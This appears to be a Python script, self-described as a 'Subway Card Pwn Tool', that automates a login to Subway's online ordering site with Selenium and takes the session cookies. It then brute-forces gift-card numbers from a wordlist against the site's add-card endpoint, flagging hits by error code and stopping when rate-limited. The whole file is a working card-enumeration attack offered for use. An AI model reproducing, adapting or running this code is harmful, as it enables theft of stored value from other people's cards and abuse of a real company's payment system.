import selenium
import time
import requests
import json
import base64
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

print("                ____  __ __")
print("   ____ _____  / __ \/ //_/")
print("  / __ `/ __ \/ /_/ / ,<   ")
print(" / /_/ / / / / _, _/ /| |  ")
print(" \__,_/_/ /_/_/ |_/_/ |_|  ")
print(" anRK - An RKeins Subsidary.")
print("SUBPAR: Subway Card Pwn Tool      ")
print("")
print("OPEN VERSION -- FOR PUBLIC RELEASE")
input("Press Enter To Start...")

#The code bellow was for debugging. Change as needed.
Login=input("Please type in your subway email")
Password=input("Please type in your subway password.")
Direcc=input("Lastly, tell me where you put the chromeweb-driver")
#Im not telling you about the wordlist generation because it still has the potential to be misused. 
print("Alrighty you script kids, I hope you put the wordlist here and named it 'Sub1.txt'. If you didn't then get prankd lol.")
Checked_File = open('Checked.txt', 'a')
Checked_list = open('Checked.txt', 'r').read().splitlines()
Content_list = open("Sub1.txt",'r').read().splitlines()

driver = webdriver.Chrome(r'C:\Standalone\chromedriver.exe')
driver.get('https://order.subway.com/en-CA/signin?url=/en-CA/profile/paymentmethods')
content_list = open("Sub1.txt",'r').read().splitlines()

element = WebDriverWait(driver, 999999999999999).until(EC.presence_of_element_located((By.ID, "signInName")))
#wabo = WebDriverWait(driver,
#30).until(EC.presence_of_element_located((By.CLASS_NAME,
#"notificationClose")))
element2 = WebDriverWait(driver, 9).until(EC.presence_of_element_located((By.ID, "signInName")))

usrnm = driver.find_element_by_id("signInName")
time.sleep(5)
usrnm.send_keys(str(Login))
psswr = driver.find_element_by_id("password")
time.sleep(1)
psswr.send_keys(str(Password))
time.sleep(1)
login = driver.find_element_by_id("next")
login.click()
time.sleep(10)

Signin = False

while Signin == False:
    try:
        WebDriverWait(driver, 15).until(EC.presence_of_element_located((By.ID, "comp-payment-management")))
        Signin = True
    except:
        driver.refresh()
        element2 = WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.ID, "signInName")))
        usrnm = driver.find_element_by_id("signInName")
        usrnm.send_keys(str(Login))
        psswr = driver.find_element_by_id("password")
        time.sleep(1)
        psswr.send_keys(str(Password))
        login = driver.find_element_by_id("next")
        login.click()

AllCookie = driver.get_cookies()
print("__________________________________________BREAKER__________________________________________________________________")
#print(AllCookie)

#for i in range(len(AllCookie)):
for dictionary in AllCookie:
    if dictionary['name'] == '.ASPXAUTH':
        _AspxAuth = dictionary['value']
                    

for dictionary in AllCookie:
    if dictionary['name'] == '.AspNet.Cookies':
        _AspNetCookie = dictionary['value']      
        
print("__________________________________________BREAKER2__________________________________________________________________")

cookies = {
    '.AspNet.Cookies': _AspNetCookie,
    '.ASPXAUTH': _AspxAuth,
}

headers = {
    'Host': 'order.subway.com',
    'Content-Length': '102',
    'Sec-Ch-Ua': '" Not A;Brand";v="99", "Chromium";v="96"',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Content-Type': 'application/json; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Sec-Ch-Ua-Mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Origin': 'https://order.subway.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://order.subway.com/en-CA/profile/paymentmethods',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
}

print(headers)
# Group site is REDACTED
data = '{"Pan":"1111111111111111","Pin":"11111111","StoreID":"REDACTED-0","Preferred":true,"HasSavePayment":true}'

print("System fully opperational.")

input("Awaiting GO Signal. Press Enter To Launch")
print("")
print("       / __ \ / //_/___   (_)____   _____")
print("      / /_/ // ,<  / _ \ / // __ \ / ___/")
print("     / _, _// /| |/  __// // / / /(__  ) ")
print("    /_/ |_|/_/ |_|\___//_//_/ /_//____/  ")
print(" Electonic Integrated Networking Systems")
print("Launching attack . . . ")

key = 'ErrorCode":"119"'
Err = 'ErrorCode":"185"'
for i in range(len(content_list)):
    if any(item in content_list[i] for item in Checked_list):
        continue
    else:
        data = '{"Pan":"' + content_list[i] + '","Pin":"11111111","StoreID":"REDACTED-0","Preferred":true,"HasSavePayment":true}'
        response = requests.post('https://order.subway.com/RemoteOrder/Payments/AddSubwayCard', headers=headers, data=data, cookies=cookies)
        print(response.content)
        print(type(response))

        time.sleep(10)
        if key in str(response.content):
           print("We got a valid key! :", content_list[i])
           Checked_File = open('Checked.txt', 'a')
           Checked_File.writelines('\n' + content_list[i])
           Checked_File.close()
           break
        
        elif Err in str(response.content):
            print("Rate Limited. Quitting...")
            break
        Checked_File = open('Checked.txt', 'a')
        Checked_File.writelines('\n' + content_list[i])
        Checked_File.close()
